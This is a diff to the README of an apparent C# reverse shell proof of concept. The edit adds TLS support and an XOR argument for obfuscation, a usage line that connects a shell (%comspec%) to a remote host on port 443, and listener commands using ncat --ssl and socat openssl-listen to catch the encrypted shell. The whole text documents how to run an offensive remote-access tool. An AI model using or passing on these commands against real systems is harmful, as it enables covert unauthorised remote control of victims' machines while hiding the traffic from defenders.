@@ -1,10 +1,10 @@
 # csharp_reverse_shell
-c# reverse shell poc
+c# reverse shell poc that also does TLS
 
-Executes whatever is set in the specified environment variable (3rd argument),
+Specify host, port, command, arguments, int XOR
 
-The environment variable can also be passed as an XORed string with an integer (4th argument) for opsafety --yeah right
+Catch it with ncat --ssl or socat openssl-listen:443,cert=cert.pem,verify=0 
 
 All arguments are required,
 
-e.g > csharp_reverse_shell.exe 192.168.205.13 443 comspec 00
+e.g > csharp_reverse_shell.exe host 443 %comspec% "" 00
